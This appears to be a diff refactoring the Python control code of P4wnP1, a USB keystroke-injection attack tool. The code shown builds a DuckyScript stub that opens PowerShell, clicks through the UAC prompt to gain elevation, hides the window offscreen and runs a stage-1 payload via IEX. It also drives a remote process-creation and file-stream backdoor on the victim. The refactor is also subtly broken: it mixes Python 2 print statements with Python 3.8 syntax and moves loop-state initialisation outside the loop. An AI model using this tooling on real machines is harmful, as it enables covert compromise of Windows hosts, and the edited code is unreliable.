@@ -223,8 +223,7 @@ Use "help FireStage1" to get more details.
 	def onClientProcessExitted(self, payload):
 		# fetch proc id
 		proc_id = struct.unpack("!I", payload)[0]
-		proc = self.client.getProcess(proc_id)
-		if proc:
+		if proc := self.client.getProcess(proc_id):
 			proc.hasExited = True
 			self.print_reprompt("Proc with id {0} exited".format(proc_id))
 			if not proc.keepTillInteract:
@@ -291,12 +290,12 @@ Use "help FireStage1" to get more details.
 			
 
 	def __input_handler(self):
+		# processing input data
+
+
+		indata = False
+		bytes_rcvd = 0
 		while self.running:
-			# processing input data
-
-
-			indata = False
-			bytes_rcvd = 0
 			while self.tl.data_available():
 				stream = self.tl.pop_input_stream()
 
@@ -306,7 +305,7 @@ Use "help FireStage1" to get more details.
 				if (ch == 0):
 					# control channel, extract control message type
 					msg_type,payload = struct.unpack("!I{0}s".format(len(payload) - 4), payload)
-			
+
 					if msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_REQ_STAGE2:
 						P4wnP1.print_debug("indata: Control channel, control message STAGE2 REQUEST")
 						self.client.setStage2("REQUESTED")
@@ -344,7 +343,7 @@ Use "help FireStage1" to get more details.
 					elif msg_type == P4wnP1.CTRL_MSG_FROM_CLIENT_CHANNEL_CLOSED:
 						channel_id = struct.unpack("!I", payload)[0]
 						self.print_reprompt("Client confirmed close of remote channel with ID {0}!".format(channel_id))
-					
+
 					else:
 						P4wnP1.print_debug("indata: Control channel, unknown control message type: {0}, payload: {1} ".format(msg_type, repr(payload)))
 
@@ -371,10 +370,10 @@ Use "help FireStage1" to get more details.
 				self.print_reprompt("\nClient didn't respond for {0} seconds.".format(data/1000))
 				self.ll.restart_background()
 				self.client.setLink(False)
-		elif signal == "TransportLayerWaitingForClient" or signal == "TransportLayerSendStream":
-			# ignore these events
-			pass
-		else:
+		elif signal not in [
+		      "TransportLayerWaitingForClient",
+		      "TransportLayerSendStream",
+		  ]:
 			P4wnP1.print_debug("Unhandled LinkLayer signal: {0}".format(signal))
 
 	
@@ -410,17 +409,17 @@ Use "help FireStage1" to get more details.
 		  There's no need to account on PID and VID, as the code is using the device serial "deadbeefdeadbeef"
 		  and the manufacturer "MaMe82".
 		'''
-	
+
 		gadget_dir = "/sys/kernel/config/usb_gadget/mame82gadget/"
-		
+
 		ps_stub ='''
 	                GUI r
 	                DELAY 500
 	                STRING powershell.exe
 	                ENTER
-	        '''		
-		ps_stub += "DELAY " + str(trigger_delay_ms) + "\n"
-		
+	        '''
+		ps_stub += f"DELAY {str(trigger_delay_ms)}" + "\n"
+
 		if bypassUAC:
 			# confirm UAC dialog with "SHIFT+TAB, ENTER" to be language independent (no "ALT+Y")
 			ps_stub += '''
@@ -433,36 +432,36 @@ Use "help FireStage1" to get more details.
 				ENTER
 		'''
 			# use trigger delay once more
-			ps_stub += "DELAY " + str(trigger_delay_ms) + "\n"
-		
+			ps_stub += f"DELAY {str(trigger_delay_ms)}" + "\n"
+
 		ps_script = ""
-		
+
 		if hideTargetWindow:
 			# move window offscreen + hide it + post request to owning window
 			ps_script += StageHelper.out_PS_SetWindowPos(x=-100, y=-100, cx=80, cy=80, flags=0x4000+0x80) + "\n"
 			#ps_script += StageHelper.out_PS_SetWindowPos(x=100, y=100, cx=80, cy=80, flags=0x4) + "\n"
 
-		
+
 		if trigger_type == 1:
 			# read PID and VID
 			pid=""
-			with open(gadget_dir+"idProduct","r") as f:
+			with open(f'{gadget_dir}idProduct', "r") as f:
 				pid=f.read()
 				pid=(pid[2:6]).upper()
-				
+
 			vid=""
-			with open(gadget_dir+"idVendor","r") as f:
+			with open(f'{gadget_dir}idVendor', "r") as f:
 				vid=f.read()
 				vid=(vid[2:6]).upper()
-				
+
 			ps_script += "$USB_VID='{0}';$USB_PID='{1}';".format(vid, pid) 
-			
+
 			with open(self.config["PATH_STAGE1_PS"],"rb") as f:	
 				ps_script += StageHelper.out_PS_IEX_Invoker(f.read())
 		elif trigger_type == 2:
 			# slower .NET dll based stage 1
 			ps_script += StageHelper.out_PS_Stage1_invoker(self.config["PATH_STAGE1_DOTNET"])
-					
+
 		self.duckencoder.outhidDuckyScript(ps_stub) # print DuckyScript stub
 		self.duckencoder.outhidStringDirect(ps_script + ";exit\n") # print stage1 PowerShell script			
 		
@@ -491,10 +490,7 @@ Use "help FireStage1" to get more details.
 			self.print_reprompt("Trying to create the process resulted in error: {0}".format(proc))
 
 	def client_call_create_proc(self, filename, args, use_channels = True, waitForResult = False):
-		# build arguments: [String] ProcFilename + [String] ProcArgs
-		use_channels_byte = 0
-		if use_channels:
-			use_channels_byte = 1
+		use_channels_byte = 1 if use_channels else 0
 		method_args = struct.pack("!B{0}sx{1}sx".format(len(filename), len(args)), use_channels_byte, filename, args) # create null terminated strings from process name and args
 
 		self.client.callMethod("core_create_proc", method_args, self.handler_client_create_proc, waitForResult = waitForResult)
@@ -572,7 +568,7 @@ Use "help FireStage1" to get more details.
 			print "Process created without channels, PID: {0}".format(proc_id)
 
 	def handler_client_inform_channel_added(self, response):
-		P4wnP1.print_debug("Channel added inform " + repr(response))
+		P4wnP1.print_debug(f"Channel added inform {repr(response)}")
 		
 	def handler_client_destroy_channel(self, response):
 		channel_id =  struct.unpack("!I",  response)[0]
@@ -1020,9 +1016,7 @@ Use "help FireStage1" to get more details.
 		return self.client.callMethod("core_fs_close_stream", method_args, self.handler_pass_through_result, error_handler=self.handler_pass_through_result, waitForResult = True, deliverResult = True)
 	
 	def client_call_open_stream_channel(self, stream_id, passthrough = True):
-		pt = 1
-		if not passthrough:
-			pt = 0
+		pt = 0 if not passthrough else 1
 		method_args = struct.pack("!iB", stream_id, pt)
 		# we could use the create proc handler
 		return self.client.callMethod("core_open_stream_channel", method_args, self.handler_pass_through_result, error_handler=self.handler_pass_through_result, waitForResult = True, deliverResult = True)
